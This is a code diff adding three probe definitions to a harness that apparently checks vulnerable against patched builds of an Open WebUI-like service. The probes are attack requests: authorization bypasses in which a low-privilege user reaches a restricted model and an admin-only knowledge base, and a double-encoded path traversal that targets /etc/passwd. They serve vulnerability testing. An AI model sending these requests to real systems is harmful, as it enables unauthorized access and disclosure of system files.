@@ -274,6 +274,30 @@ def _run_diff_harness(pair: BV2PPair, port_vuln: int, port_patched: int) -> dict
             "body": None,
             "setup": None,
         },
+        # BFLA arena: bob (no gpt-4o access) triggers arena with bypass_filter=True
+        "openwebui-bfla-arena-model": {
+            "path": "/api/v1/arena/complete",
+            "method": "POST",
+            "headers": {"x-user-id": "bob"},
+            "body": {"model": "gpt-4o", "prompt": "test", "bypass_filter": True},
+            "setup": "/reset",
+        },
+        # BFLA KB upload: bob uploads file with knowledge_id=kb-restricted (admin-only)
+        "openwebui-bfla-kb-upload": {
+            "path": "/api/v1/files/",
+            "method": "POST",
+            "headers": {"x-user-id": "bob"},
+            "body": {"file_id": "f-evil", "filename": "evil.pdf", "knowledge_id": "kb-restricted"},
+            "setup": "/reset",
+        },
+        # Path traversal: double-encoded traversal bypasses decode-cap guard
+        "openwebui-path-traversal-proxy": {
+            "path": "/proxy/static/%252e%252e%252fetc%252fpasswd",
+            "method": "GET",
+            "headers": {},
+            "body": None,
+            "setup": None,
+        },
     }
 
     spec = PROBE_SPECS.get(pair.pair_id)
